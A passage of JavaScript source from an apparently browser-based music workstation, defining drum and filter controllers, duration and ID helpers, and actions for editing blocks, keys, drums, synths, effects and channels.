		this.on.removeTrack( id );
	}
	_changeTrack( id, obj ) {
		this._changeTrackProp( id, "toggle", obj.toggle, this.on.toggleTrack );
		this._changeTrackProp( id, "name", obj.name, this.on.renameTrack );
		this._changeTrackProp( id, "order", obj.order, this.on.reorderTrack );
	}
	_changeTrackProp( id, prop, val, fn ) {
		if ( val !== undefined ) {
			this.data[ id ][ prop ] = val;
			fn( id, val );
		}
	}
};

Object.freeze( DAWCore.controllers.drums );

DAWCore.controllersFx.filter = class {
	constructor( fns ) {
		this.on = GSUtils.mapCallbacks( [
			"type",
			"Q",
			"gain",
			"detune",
			"frequency",
			"drawCurve",
		], fns.dataCallbacks );
		this.data = Object.seal( DAWCore.json.effects.filter() );
		Object.freeze( this );
	}

	recall() {
		this.on.type( this.data.type );
		this.on.Q( this.data.Q );
		this.on.gain( this.data.gain );
		this.on.detune( this.data.detune );
		this.on.frequency( this.data.frequency );
		this.on.drawCurve();
	}
	change( obj ) {
		this._changeProp( "type", obj.type, this.on.type );
		this._changeProp( "Q", obj.Q, this.on.Q );
		this._changeProp( "gain", obj.gain, this.on.gain );
		this._changeProp( "detune", obj.detune, this.on.detune );
		this._changeProp( "frequency", obj.frequency, this.on.frequency );
		this.on.drawCurve();
	}

	_changeProp( prop, val, cb ) {
		if ( val !== undefined ) {
			this.data[ prop ] = val;
			cb( val );
		}
	}
};

Object.freeze( DAWCore.controllersFx.filter );

DAWCore.common.calcNewDuration = ( changeObj, get ) => {
	const blocks = changeObj.blocks || {},
		bPM = changeObj.beatsPerMeasure || get.beatsPerMeasure(),
		dur = Object.entries( get.blocks() ).reduce( ( max, [ id, blc ] ) => {
			const blcChange = blocks[ id ];

			if ( blcChange || !( id in blocks ) ) {
				const when = blcChange?.when ?? blc.when,
					dur = blcChange?.duration ?? blc.duration;

				return Math.max( max, when + dur );
			}
			return max;
		}, 0 ),
		dur2 = Object.entries( blocks ).reduce( ( max, [ id, blc ] ) => {
			return blc && !get.block( id )
				? Math.max( max, blc.when + blc.duration )
				: max;
		}, dur );

	return Math.ceil( dur2 / bPM ) * bPM;
};

DAWCore.common.calcNewKeysDuration = ( keysId, keysObj, get ) => {
	const bPM = get.beatsPerMeasure(),
		keys = get.keys( keysId ),
		dur = Object.entries( keys ).reduce( ( max, [ id, key ] ) => {
			const keyChange = keysObj[ id ];

			if ( keyChange || !( id in keysObj ) ) {
				const when = keyChange?.when ?? key.when,
					dur = keyChange?.duration ?? key.duration;

				return Math.max( max, when + dur );
			}
			return max;
		}, 0 ),
		dur2 = Object.entries( keysObj ).reduce( ( max, [ id, key ] ) => {
			return key && !keys[ id ]
				? Math.max( max, key.when + key.duration )
				: max;
		}, dur );

	return Math.max( 1, Math.ceil( dur2 / bPM ) ) * bPM;
};

DAWCore.common.createUniqueName = ( collection, name, get ) => {
	const arr = Object.values( get[ collection ]() );

	return GSUtils.uniqueName( name, arr.map( obj => obj.name ) );
};

DAWCore.common.getDrumrowName = ( rowId, get ) => {
	return get.pattern( get.drumrow( rowId ).pattern ).name;
};

DAWCore.common.getNextIdOf = obj => {
	const id = Object.keys( obj )
		.reduce( ( max, id ) => Math.max( max, +id || 0 ), 0 );

	return `${ id + 1 }`;
};

DAWCore.common.getNextOrderOf = obj => {
	return Object.values( obj )
		.reduce( ( max, item ) => Math.max( max, item.order ), -1 ) + 1;
};

DAWCore.common.toggleSolo = ( soloId, list ) => {
	const entries = Object.entries( list ),
		someOn = entries.some( kv => kv[ 0 ] !== soloId && kv[ 1 ].toggle === true ),
		obj = entries.reduce( ( obj, [ id, item ] ) => {
			const itself = id === soloId;

			if ( ( itself && !item.toggle ) || ( !itself && item.toggle === someOn ) ) {
				obj[ id ] = { toggle: !item.toggle };
			}
			return obj;
		}, {} );

	return [ !someOn, obj ];
};

DAWCore.common.updatePatternDuration = ( obj, patId, duration, get ) => {
	if ( duration !== get.pattern( patId ).duration ) {
		const objBlocks = Object.entries( get.blocks() )
				.reduce( ( obj, [ id, blc ] ) => {
					if ( blc.pattern === patId && !blc.durationEdited ) {
						obj[ id ] = { duration };
					}
					return obj;
				}, {} );

		obj.patterns = { [ patId ]: { duration } };
		GSUtils.addIfNotEmpty( obj, "blocks", objBlocks );
		if ( GSUtils.isntEmpty( objBlocks ) ) {
			const dur = DAWCore.common.calcNewDuration( obj, get );

			if ( dur !== get.duration() ) {
				obj.duration = dur;
			}
		}
	}
};

DAWCore.actions.addBlock = ( pattern, when, track, get ) => {
	const pat = get.pattern( pattern ),
		nId = DAWCore.common.getNextIdOf( get.blocks() ),
		objBlc = DAWCore.json.block( {
			pattern,
			when,
			track,
			duration: pat.duration,
		} ),
		obj = { blocks: { [ nId ]: objBlc } },
		dur = DAWCore.common.calcNewDuration( obj, get );

	if ( dur !== get.duration() ) {
		obj.duration = dur;
	}
	return [
		obj,
		[ "blocks", "addBlock", pat.name ],
	];
};

DAWCore.actions.addBuffers = ( obj, get ) => {
	return [
		obj,
	];
};

DAWCore.actions.addChannel = get => {
	const channels = get.channels(),
		id = DAWCore.common.getNextIdOf( channels ),
		order = DAWCore.common.getNextOrderOf( channels ),
		name = `chan ${ id }`,
		chanObj = DAWCore.json.channel( { order, name } );

	return [
		{ channels: { [ id ]: chanObj } },
		[ "channels", "addChannel", name ],
	];
};

DAWCore.actions.addDrumcuts = ( patternId, rowId, whenFrom, whenTo, get ) => {
	return DAWCore.actions._addDrums( "drumcut", true, patternId, rowId, whenFrom, whenTo, get );
};

DAWCore.actions.addDrumrow = ( pattern, get ) => {
	const pat = get.pattern( pattern );

	if ( pat.type === "buffer" ) {
		const drumrows = get.drumrows(),
			id = DAWCore.common.getNextIdOf( drumrows ),
			order = DAWCore.common.getNextOrderOf( drumrows ),
			rowObj = DAWCore.json.drumrow( { pattern, order } );

		return [
			{ drumrows: { [ id ]: rowObj } },
			[ "drumrows", "addDrumrow", pat.name ],
		];
	}
};

DAWCore.actions.addDrums = ( patternId, rowId, whenFrom, whenTo, get ) => {
	return DAWCore.actions._addDrums( "drum", true, patternId, rowId, whenFrom, whenTo, get );
};

DAWCore.actions._addDrums = ( type, status, patternId, rowId, whenFrom, whenTo, get ) => {
	const stepDur = 1 / get.stepsPerBeat(),
		whenA = Math.round( Math.min( whenFrom, whenTo ) / stepDur ),
		whenB = Math.round( Math.max( whenFrom, whenTo ) / stepDur ),
		pat = get.pattern( patternId ),
		drums = get.drums( pat.drums ),
		patRowId = get.drumrow( rowId ).pattern,
		patRow = get.pattern( patRowId ),
		drumsEnt = Object.entries( drums ),
		drumsMap = drumsEnt.reduce( ( map, [ drumId, drum ] ) => {
			if ( drum.row === rowId && type === "drum" === "gain" in drum ) {
				map.set( Math.round( drum.when / stepDur ), drumId );
			}
			return map;
		}, new Map() ),
		newDrums = {},
		nextDrumId = +DAWCore.common.getNextIdOf( drums ),
		jsonType = DAWCore.json[ type ];
	let nbDrums = 0,
		drumWhenMax = pat.duration;

	for ( let w = whenA; w <= whenB; ++w ) {
		const drmId = drumsMap.get( w );

		if ( drmId ) {
			if ( !status ) {
				newDrums[ drmId ] = undefined;
				++nbDrums;
			}
		} else if ( status ) {
			const when = w * stepDur;

			drumWhenMax = Math.max( drumWhenMax, when + .001 );
			newDrums[ nextDrumId + nbDrums ] = jsonType( { when, row: rowId } );
			++nbDrums;
		}
	}
	if ( nbDrums > 0 && !status ) {
		drumWhenMax = drumsEnt.reduce( ( dur, [ drumId, drum ] ) => {
			return drumId in newDrums
				? dur
				: Math.max( dur, drum.when + .001 );
		}, 0 );
	}
	if ( nbDrums > 0 ) {
		const bPM = get.beatsPerMeasure(),
			duration = Math.max( 1, Math.ceil( drumWhenMax / bPM ) ) * bPM,
			obj = { drums: { [ pat.drums ]: newDrums } };

		DAWCore.common.updatePatternDuration( obj, patternId, duration, get );
		return [
			obj,
			[ "drums", status ? "addDrums" : "removeDrums", pat.name, patRow.name, nbDrums ],
		];
	}
};

DAWCore.actions.addEffect = ( dest, type, get ) => {
	const fxs = get.effects(),
		destFxs = Object.values( fxs ).filter( fx => fx.dest === dest ),
		id = DAWCore.common.getNextIdOf( fxs ),
		fx = {
			dest,
			type,
			toggle: true,
			order: DAWCore.common.getNextOrderOf( destFxs ),
			data: DAWCore.json.effects[ type ](),
		};

	return [
		{ effects: { [ id ]: fx } },
		[ "effects", "addEffect", get.channel( dest ).name, type ],
	];
};

DAWCore.actions.addKey = ( patId, key, when, duration, get ) => {
	const pat = get.pattern( patId ),
		keys = get.keys( pat.keys ),
		id = DAWCore.common.getNextIdOf( keys ),
		keysObj = { [ id ]: DAWCore.json.key( { key, when, duration } ) },
		patDur = DAWCore.common.calcNewKeysDuration( pat.keys, keysObj, get ),
		obj = { keys: { [ pat.keys ]: keysObj } };

	Object.entries( keys ).reduce( ( obj, [ id, key ] ) => {
		if ( key.selected && !( id in obj ) ) {
			obj[ id ] = { selected: false };
		}
		return obj;
	}, keysObj );
	DAWCore.common.updatePatternDuration( obj, patId, patDur, get );
	return [
		obj,
		[ "keys", "addKey", pat.name ],
	];
};

DAWCore.actions.addOscillator = ( synthId, get ) => {
	const oscs = get.synth( synthId ).oscillators,
		id = DAWCore.common.getNextIdOf( oscs ),
		osc = DAWCore.json.oscillator();

	osc.order = DAWCore.common.getNextOrderOf( oscs );
	return [
		{ synths: { [ synthId ]: { oscillators: { [ id ]: osc } } } },
		[ "synth", "addOscillator", get.synth( synthId ).name ],
	];
};

DAWCore.actions.addPatternDrums = get => {
	const pats = get.patterns(),
		drumsId = DAWCore.common.getNextIdOf( get.drums() ),
		patId = DAWCore.common.getNextIdOf( pats ),
		patName = DAWCore.common.createUniqueName( "patterns", "drums", get ),
		order = Object.values( pats ).reduce( ( max, pat ) => {
			return pat.type !== "drums"
				? max
				: Math.max( max, pat.order );
		}, -1 ) + 1,
		obj = {
			drums: { [ drumsId ]: {} },
			patterns: { [ patId ]: {
				order,
				type: "drums",
				name: patName,
				drums: drumsId,
				duration: get.beatsPerMeasure(),
			} },
			patternDrumsOpened: patId,
		};

	return [
		obj,
		[ "patterns", "addPattern", "drums", patName ],
	];
};

DAWCore.actions.addPatternKeys = ( synthId, get ) => {
	const pats = get.patterns(),
		keysId = DAWCore.common.getNextIdOf( get.keys() ),
		patId = DAWCore.common.getNextIdOf( pats ),
		patName = DAWCore.common.createUniqueName( "patterns", "keys", get ),
		synName = get.synth( synthId ).name,
		order = Object.values( pats ).reduce( ( max, pat ) => {
			return pat.synth !== synthId
				? max
				: Math.max( max, pat.order );
		}, -1 ) + 1,
		obj = {
			keys: { [ keysId ]: {} },
			patterns: { [ patId ]: {
				order,
				type: "keys",
				name: patName,
				keys: keysId,
				synth: synthId,
				duration: get.beatsPerMeasure(),
			} },
			patternKeysOpened: patId,
		};

	if ( synthId !== get.synthOpened() ) {
		obj.synthOpened = synthId;
	}
	return [
		obj,
		[ "patterns", "addPatternKeys", patName, synName ],
	];
};

DAWCore.actions.addSynth = get => {
	const id = DAWCore.common.getNextIdOf( get.synths() ),
		name = DAWCore.common.createUniqueName( "synths", "synth", get ),
		obj = {
			synths: { [ id ]: DAWCore.json.synth( { name } ) },
			synthOpened: id,
		};

	if ( get.patternKeysOpened() != null ) {
		obj.patternKeysOpened = null;
	}
	return [
		obj,
		[ "synths", "addSynth", name ],
	];
};

DAWCore.actions.changeChannel = ( id, prop, val, get ) => {
	return [
		{ channels: { [ id ]: { [ prop ]: val } } },
		[ "channels", "changeChannel", get.channel( id ).name, prop, val ],
	];
};

DAWCore.actions.changeDrumrow = ( rowId, prop, val, get ) => {
	const patName = DAWCore.common.getDrumrowName( rowId, get );

	return [
		{ drumrows: { [ rowId ]: { [ prop ]: val } } },
		[ "drumrows", "changeDrumrow", patName, prop, val ],
	];
};

DAWCore.actions.changeDrumrowPattern = ( rowId, pattern, get ) => {
	const row = get.drumrow( rowId ),
		pat = get.pattern( pattern );

	if ( row.pattern !== pattern && pat.type === "buffer" ) {
		const oldPat = DAWCore.common.getDrumrowName( rowId, get );

		return [
			{ drumrows: { [ rowId ]: { pattern } } },
			[ "drumrows", "changeDrumrowPattern", oldPat, pat.name ],
		];
	}
};



DAWCore.actions.changeDrumsProps = ( patId, prop, arr, get ) => {
	const pat = get.pattern( patId ),
		rowId = get.drums( pat.drums )[ arr[ 0 ][ 0 ] ].row,
		patRowName = DAWCore.common.getDrumrowName( rowId, get ),
		obj = arr.reduce( ( obj, [ drmId, val ] ) => {
			obj[ drmId ] = { [ prop ]: val };
			return obj;
		}, {} );

	return [
		{ drums: { [ pat.drums ]: obj } },
		[ "drums", "changeDrumsProps", pat.name, patRowName, prop, arr.length ],
	];
};

DAWCore.actions.changeEffect = ( fxId, prop, val, get ) => {
	const fx = get.effect( fxId );

	return [
		{ effects: { [ fxId ]: { data: { [ prop ]: val } } } },
		[ "effects", "changeEffect", get.channel( fx.dest ).name, fx.type, prop ],
	];
};

DAWCore.actions.changeEnv = ( synthId, prop, val, get ) => {
	return [
		{ synths: { [ synthId ]: { env: { [ prop ]: val } } } },
		[ "synth", "changeEnv", get.synth( synthId ).name, prop, val ],
	];
};

DAWCore.actions.changeKeysEnv = ( patId, keyIds, prop, incr, get ) => {
	const pat = get.pattern( patId ),
		keys = get.keys( pat.keys ),
		keysObj = keyIds.reduce( ( obj, id ) => {
			obj[ id ] = { [ prop ]: +( keys[ id ][ prop ] + incr ).toFixed( 3 ) };
			return obj;
		}, {} );

	return [
		{ keys: { [ pat.keys ]: keysObj } },
		[ "keys", "changeKeysEnv", pat.name, keyIds.length, prop ],
	];
};

DAWCore.actions.changeKeysProps = ( patId, prop, arr, get ) => {
	const pat = get.pattern( patId ),
		obj = arr.reduce( ( obj, [ keyId, val ] ) => {
			obj[ keyId ] = { [ prop ]: val };
			return obj;
		}, {} );

	return [
		{ keys: { [ pat.keys ]: obj } },
		[ "keys", "changeKeysProps", pat.name, prop, arr.length ],
	];
};

DAWCore.actions.changeLFO = ( synthId, prop, val, get ) => {
	return [
		{ synths: { [ synthId ]: { lfo: { [ prop ]: val } } } },
		[ "synth", "changeLFO", get.synth( synthId ).name, prop, val ],
	];
};

DAWCore.actions.changeLoop = ( a, b ) => {
	return Number.isFinite( a )
		? [
			{ loopA: a, loopB: b },
			[ "cmp", "changeLoop", a, b ]
		] : [
			{ loopA: null, loopB: null },
			[ "cmp", "removeLoop" ]
		];
};

DAWCore.actions.changeOscillator = ( synthId, oscId, prop, val, get ) => {
	return [
		{ synths: { [ synthId ]: { oscillators: { [ oscId ]: { [ prop ]: val } } } } },
		[ "synth", "changeOscillator", get.synth( synthId ).name, prop, val ],
	];
};

DAWCore.actions.changeTempo = ( bpm, bPM, sPB, get ) => {
	const bpmChanged = bpm !== get.bpm(),
		signChanged =
			bPM !== get.beatsPerMeasure() ||
			sPB !== get.stepsPerBeat();

	if ( signChanged || bpmChanged ) {
		const obj = {},
			objPatterns = {},
			patts = Object.entries( get.patterns() );

		if ( signChanged ) {
			obj.beatsPerMeasure = bPM;
			obj.stepsPerBeat = sPB;
			patts.forEach( ( [ id, pat ] ) => {
				if ( pat.type === "keys" || pat.type === "drums" ) {
					const duration = Math.max( 1, Math.ceil( pat.duration / bPM ) ) * bPM;

					if ( duration !== pat.duration ) {
						objPatterns[ id ] = { duration };
					}
				}
			} );
		}
		if ( bpmChanged ) {
			obj.bpm = bpm;
			patts.forEach( ( [ id, pat ] ) => {
				if ( pat.type === "buffer" ) {
					const bufDur = get.buffer( pat.buffer ).duration,
						duration = Math.ceil( bufDur * ( bpm / 60 ) );

					if ( duration !== pat.duration ) {
						objPatterns[ id ] = { duration };
					}
				}
			} );
		}
		if ( GSUtils.isntEmpty( objPatterns ) ) {
			const objBlocks = {};

			obj.patterns = objPatterns;
			Object.entries( get.blocks() ).forEach( ( [ id, blc ] ) => {
				const pat = objPatterns[ blc.pattern ];

				if ( pat && !blc.durationEdited ) {
					objBlocks[ id ] = { duration: pat.duration };
				}
			} );
			GSUtils.addIfNotEmpty( obj, "blocks", objBlocks );
			if ( GSUtils.isntEmpty( objBlocks ) ) {
				const dur = DAWCore.common.calcNewDuration( obj, get );

				if ( dur !== get.duration() ) {
					obj.duration = dur;
				}
			}
		}
		return [
			obj,
			[ "cmp", "changeTempo", bpm, bPM, sPB ],
		];
	}
};

DAWCore.actions.clonePattern = ( patId, get ) => {
	const pat = get.pattern( patId ),
		type = pat.type,
		newPat = { ...pat },
		newPatId = DAWCore.common.getNextIdOf( get.patterns() ),
		obj = { patterns: { [ newPatId ]: newPat } };

	newPat.name = DAWCore.common.createUniqueName( "patterns", pat.name, get );
	++newPat.order;
	if ( type === "keys" || type === "drums" ) {
		const newCnt = GSUtils.jsonCopy( get[ type ]( pat[ type ] ) ),
			newCntId = DAWCore.common.getNextIdOf( get[ type ]() );

		newPat[ type ] = newCntId;
		obj[ type ] = { [ newCntId ]: newCnt };
		obj[ type === "keys"
			? "patternKeysOpened"
			: "patternDrumsOpened" ] = newPatId;
		Object.entries( get.patterns() )
			.filter( type === "keys"
				? ( [ , pat ] ) => pat.type === type && pat.order >= newPat.order && pat.synth === newPat.synth
				: ( [ , pat ] ) => pat.type === type && pat.order >= newPat.order )
			.forEach( ( [ id, pat ] ) => obj.patterns[ id ] = { order: pat.order + 1 } );
	}
	return [
		obj,
		[ "patterns", "clonePattern", newPat.type, newPat.name, pat.name ],
	];
};

DAWCore.actions.cloneSelectedKeys = ( patId, keyIds, whenIncr, get ) => {
	const pat = get.pattern( patId ),
		keys = get.keys( pat.keys ),
		nextId = DAWCore.common.getNextIdOf( keys ),
		keysObj = {},
		obj = { keys: { [ pat.keys ]: keysObj } },
		mapIds = keyIds.reduce( ( map, id, i ) => {
			const nId = `${ nextId + i }`,
				nKey = { ...keys[ id ] };

			nKey.when += whenIncr;
			nKey.prev =
			nKey.next = null;
			keysObj[ id ] = { selected: false };
			keysObj[ nId ] = nKey;
			map.set( id, nId );
			return map;
		}, new Map() ),
		dur = DAWCore.common.calcNewKeysDuration( pat.keys, keysObj, get );

	keyIds.forEach( id => {
		const keyNext = keys[ id ].next;

		if ( mapIds.has( keyNext ) ) {
			const nId = mapIds.get( id ),
				nIdNext = mapIds.get( keyNext );

			keysObj[ nId ].next = nIdNext;
			keysObj[ nIdNext ].prev = nId;
		}
	} );
	DAWCore.common.updatePatternDuration( obj, patId, dur, get );
	return [
		obj,
		[ "keys", "cloneSelectedKeys", pat.name, keyIds.length ],
	];
};

DAWCore.actions.closePattern = ( type, get ) => {
	const attr = type === "keys"
			? "patternKeysOpened"
			: type === "drums"
				? "patternDrumsOpened"
				: "patternBufferOpened";

	if ( get[ attr ]() ) {
		return { [ attr ]: null };
	}
};

DAWCore.actions.cropEndBlocks = ( blcIds, whenIncr, get ) => {
	const blocks = blcIds.reduce( ( obj, id ) => {
			obj[ id ] = {
				duration: get.block( id ).duration + whenIncr,
				durationEdited: true,
			};
			return obj;
		}, {} ),
		obj = { blocks },
		dur = DAWCore.common.calcNewDuration( obj, get );

	if ( dur !== get.duration() ) {
		obj.duration = dur;
	}
	return [
		obj,
		[ "blocks", "cropEndBlocks", blcIds.length ],
	];
};

DAWCore.actions.cropEndKeys = ( patId, keyIds, durIncr, get ) => {
	const pat = get.pattern( patId ),
		patKeys = get.keys( pat.keys ),
		keys = keyIds.reduce( ( obj, id ) => {
			const k = patKeys[ id ],
				attRel = k.attack + k.release,
				duration = k.duration + durIncr,
				o = { duration };

			obj[ id ] = o;
			if ( duration < attRel ) {
				o.attack = +( k.attack / attRel * duration ).toFixed( 3 );
				o.release = +( k.release / attRel * duration ).toFixed( 3 );
			}
			return obj;
		}, {} ),
		obj = { keys: { [ pat.keys ]: keys } },
		duration = DAWCore.common.calcNewKeysDuration( pat.keys, keys, get );

	DAWCore.common.updatePatternDuration( obj, patId, duration, get );
	return [
		obj,
		[ "keys", "cropEndKeys", pat.name, keyIds.length ],
	];
};

DAWCore.actions.cropStartBlocks = ( blcIds, whenIncr, get ) => {
	const blocks = blcIds.reduce( ( obj, id ) => {
			const blc = get.block( id );

			obj[ id ] = {
				when: blc.when + whenIncr,
				offset: blc.offset + whenIncr,
				duration: blc.duration - whenIncr,
				durationEdited: true,
			};
			return obj;
		}, {} );

	return [
		{ blocks },
		[ "blocks", "cropStartBlocks", blcIds.length ],
	];
};

DAWCore.actions.duplicateSelectedBlocks = ( whenIncr, get ) => {
	const sel = Object.entries( get.blocks() ).filter( kv => kv[ 1 ].selected ),
		newId = +DAWCore.common.getNextIdOf( get.blocks() ),
		blocks = sel.reduce( ( obj, [ id, blc ], i ) => {
			const cpy = { ...blc };

			cpy.when += whenIncr;
			obj[ id ] = { selected: false };
			obj[ newId + i ] = cpy;
			return obj;
		}, {} ),
		obj = { blocks },
		dur = DAWCore.common.calcNewDuration( obj, get );

	if ( dur !== get.duration() ) {
		obj.duration = dur;
	}
	return [
		obj,
		[ "blocks", "duplicateSelectedBlocks", sel.length ],
	];
};

DAWCore.actions.moveBlocks = ( blcIds, whenIncr, trackIncr, get ) => {
	const blocks = {},
		obj = { blocks },
		tr = Object.entries( get.tracks() ).sort( ( a, b ) => a[ 1 ].order < b[ 1 ].order );

	blcIds.forEach( id => {
		const blc = get.block( id ),
			obj = {};

		blocks[ id ] = obj;
		if ( whenIncr ) {
			obj.when = blc.when + whenIncr;
		}
		if ( trackIncr ) {
			obj.track = tr[ tr.findIndex( kv => kv[ 0 ] === blc.track ) + trackIncr ][ 0 ];
		}
	} );
	if ( whenIncr ) {
		const dur = DAWCore.common.calcNewDuration( obj, get );

		if ( dur !== get.duration() ) {
			obj.duration = dur;
		}
	}
	return [
		obj,
		[ "blocks", "moveBlocks", blcIds.length ],
	];
};

DAWCore.actions.moveKeys = ( patId, keyIds, whenIncr, keyIncr, get ) => {
	const pat = get.pattern( patId ),
		patKeys = get.keys( pat.keys ),
		keys = keyIds.reduce( ( obj, id ) => {
			const k = patKeys[ id ],
				o = {};

			obj[ id ] = o;
			if ( whenIncr ) {
				o.when = k.when + whenIncr;
			}
			if ( keyIncr ) {
				o.key = k.key - keyIncr;
			}
			return obj;
		}, {} ),
		obj = { keys: { [ pat.keys ]: keys } };

	if ( whenIncr ) {
		const duration = DAWCore.common.calcNewKeysDuration( pat.keys, keys, get );

		DAWCore.common.updatePatternDuration( obj, patId, duration, get );
	}
	return [
		obj,
		[ "keys", "moveKeys", pat.name, keyIds.length ],
	];
};

DAWCore.actions.openPattern = ( patId, get ) => {
	const pat = get.pattern( patId );

	switch ( pat.type ) {
		case "drums":
			if ( patId !== get.patternDrumsOpened() ) {
				return { patternDrumsOpened: patId };
			}
			break;
		case "keys":
			if ( patId !== get.patternKeysOpened() ) {
				const obj = { patternKeysOpened: patId };

				if ( pat.synth !== get.synthOpened() ) {
					obj.synthOpened = pat.synth;
				}
				return obj;
			}
			break;
	}
};

DAWCore.actions.openSynth = ( id, get ) => {
	if ( id !== get.synthOpened() ) {
		const pat = Object.entries( get.patterns() ).find( kv => kv[ 1 ].synth === id ),
			patId = pat ? pat[ 0 ] : null,
			obj = { synthOpened: id };

		if ( patId !== get.patternKeysOpened() ) {
			obj.patternKeysOpened = patId;
		}
		return obj;
	}
};

DAWCore.actions.redirectChannel = ( id, dest, get ) => {
	if ( id !== dest ) {
		return [
			{ channels: { [ id ]: { dest } } },
			[ "channels", "redirectChannel", get.channel( id ).name, get.channel( dest ).name ],
		];
	}
};

DAWCore.actions.redirectKey = ( patId, keyId, destKeyId, get ) => {
	const pat = get.pattern( patId ),
		key = get.keys( pat.keys )[ keyId ],
		keys = {};

	if ( destKeyId ) {
		keys[ keyId ] = { next: destKeyId };
		keys[ destKeyId ] = { prev: keyId };
		if ( key.next ) {
			keys[ key.next ] = { prev: null };
		}
	} else {
		keys[ keyId ] = { next: null };
		keys[ key.next ] = { prev: null };
	}
	return [
		{ keys: { [ pat.keys ]: keys } },
		[ "keys", "redirectKey", pat.name, !!destKeyId ],
	];
};

DAWCore.actions.redirectPatternBuffer = ( id, dest, get ) => {
	return [
		{ patterns: { [ id ]: { dest } } },
		[ "patterns", "redirectPatternBuffer", get.pattern( id ).name, get.channel( dest ).name ],
	];
};

DAWCore.actions.redirectPatternKeys = ( patId, synthId, patterns, get ) => {
	const obj = { patterns };

	if ( patId === get.patternKeysOpened() ) {
		obj.synthOpened = synthId;
	}
	return [
		obj,
		[ "patterns", "redirectPatternKeys", get.pattern( patId ).name, get.synth( synthId ).name ],
	];
};

DAWCore.actions.redirectSynth = ( id, dest, get ) => {
	return [
		{ synths: { [ id ]: { dest } } },
		[ "synths", "redirectSynth", get.synth( id ).name, get.channel( dest ).name ],
	];
};

DAWCore.actions.removeBlocks = ( blcIds, get ) => {
	const blocks = blcIds.reduce( ( obj, id ) => {
			obj[ id ] = undefined;
			return obj;
		}, {} ),
		obj = { blocks },
		dur = DAWCore.common.calcNewDuration( obj, get );
	let selLen = 0;

	Object.entries( get.blocks() ).forEach( ( [ id, blc ] ) => {
		if ( blc.selected && !( id in blocks ) ) {
			++selLen;
			blocks[ id ] = { selected: false };
		}
	} );
	if ( dur !== get.duration() ) {
		obj.duration = dur;
	}
	return [
		obj,
		blcIds.length
			? [ "blocks", "removeBlocks", blcIds.length ]
			: [ "blocks", "unselectAllBlocks", selLen ],
	];
};

DAWCore.actions.removeChannel = ( id, get ) => {
	if ( id !== "main" ) {
		const red = DAWCore.actions.removeChannel_redirect,
			destMain = { dest: "main" },
			channels = red( id, get.channels(), { [ id ]: undefined }, destMain ),
			patterns = red( id, get.patterns(), {}, destMain ),
			effects = red( id, get.effects(), {}, undefined ),
			synths = red( id, get.synths(), {}, destMain ),
			obj = { channels };

		GSUtils.addIfNotEmpty( obj, "synths", synths );
		GSUtils.addIfNotEmpty( obj, "effects", effects );
		GSUtils.addIfNotEmpty( obj, "patterns", patterns );
		return [
			obj,
			[ "channels", "removeChannel", get.channel( id ).name ],
		];
	}
};

DAWCore.actions.removeChannel_redirect = ( chanId, list, obj, val ) => {
	return Object.entries( list ).reduce( ( obj, kv ) => {
		if ( kv[ 1 ].dest === chanId ) {
			obj[ kv[ 0 ] ] = val;
		}
		return obj;
	}, obj );
};

DAWCore.actions.removeDrumcuts = ( patternId, rowId, whenFrom, whenTo, get ) => {
	return DAWCore.actions._addDrums( "drumcut", false, patternId, rowId, whenFrom, whenTo, get );
};

DAWCore.actions.removeDrumrow = ( rowId, get ) => {
	const patName = DAWCore.common.getDrumrowName( rowId, get );

	return [
		DAWCore.actions._removeDrumrow( {}, rowId, get ),
		[ "drumrows", "removeDrumrow", patName ],
	];
};

DAWCore.actions._removeDrumrow = ( obj, rowId, get ) => {
	const bPM = get.beatsPerMeasure(),
		blocksEnt = Object.entries( get.blocks() ),
		patternsEnt = Object.entries( get.patterns() ),
		objDrums = {},
		objBlocks = {},
		objPatterns = {};

	obj.drumrows = obj.drumrows || {};
	obj.drumrows[ rowId ] = undefined;
	patternsEnt.forEach( ( [ patId, pat ] ) => {
		if ( pat.type === "drums" ) {
			const drumsObj = {},
				drumWhenMax = Object.entries( get.drums( pat.drums ) )
					.reduce( ( max, [ id, { row, when } ] ) => {
						if ( row === rowId ) {
							drumsObj[ id ] = undefined;
						}
						return row in obj.drumrows ? max : Math.max( max, when + .001 );
					}, 0 );

			if ( GSUtils.isntEmpty( drumsObj ) ) {
				const duration = Math.max( 1, Math.ceil( drumWhenMax / bPM ) ) * bPM;

				objDrums[ pat.drums ] = drumsObj;
				if ( duration !== pat.duration ) {
					objPatterns[ patId ] = { duration };
					blocksEnt.forEach( ( [ blcId, blc ] ) => {
						if ( blc.pattern === patId && !blc.durationEdited ) {
							objBlocks[ blcId ] = { duration };
						}
					} );
				}
			}
		}
	} );
	GSUtils.addIfNotEmpty( obj, "drums", objDrums );
	GSUtils.addIfNotEmpty( obj, "blocks", objBlocks );
	GSUtils.addIfNotEmpty( obj, "patterns", objPatterns );
	if ( GSUtils.isntEmpty( objBlocks ) ) {
		const dur = DAWCore.common.calcNewDuration( obj, get );

		if ( dur !== get.duration() ) {
			obj.duration = dur;
		}
	}
	return obj;
};

DAWCore.actions.removeDrums = ( patternId, rowId, whenFrom, whenTo, get ) => {
	return DAWCore.actions._addDrums( "drum", false, patternId, rowId, whenFrom, whenTo, get );
};

DAWCore.actions.removeEffect = ( id, get ) => {
	const fx = get.effect( id );

	return [
		{ effects: { [ id ]: undefined } },
		[ "effects", "removeEffect", get.channel( fx.dest ).name, fx.type ],
	];
};

DAWCore.actions.removeKeys = ( patId, keyIds, get ) => {
	const pat = get.pattern( patId ),
		keys = get.keys( pat.keys ),
		keysObj = keyIds.reduce( ( obj, id ) => {
			const { prev, next } = keys[ id ];

			obj[ id ] = undefined;
			if ( prev !== null ) {
				const objPrev = obj[ prev ];

				if ( !( prev in obj ) || objPrev !== undefined ) {
					objPrev
						? objPrev.next = null
						: obj[ prev ] = { next: null };
				}
			}
			if ( next !== null ) {
				const objNext = obj[ next ];

				if ( !( next in obj ) || objNext !== undefined ) {
					objNext
						? objNext.prev = null
						: obj[ next ] = { prev: null };
				}
			}
			return obj;
		}, {} ),
		obj = { keys: { [ pat.keys ]: keysObj } },
		patDur = DAWCore.common.calcNewKeysDuration( pat.keys, keysObj, get ),
		selLen = Object.entries( keys ).reduce( ( nb, [ id, key ] ) => {
			if ( key.selected && !( id in keysObj ) ) {
				keysObj[ id ] = { selected: false };
				return nb + 1;
			}
			return nb;
		}, 0 );

	DAWCore.common.updatePatternDuration( obj, patId, patDur, get );
	return [
		obj,
		keyIds.length
			? [ "keys", "removeKeys", pat.name, keyIds.length ]
			: [ "keys", "unselectAllKeys", pat.name, selLen ],
	];
};

DAWCore.actions.removeOscillator = ( synthId, id, get ) => {
	return [
		{ synths: { [ synthId ]: { oscillators: { [ id ]: undefined } } } },
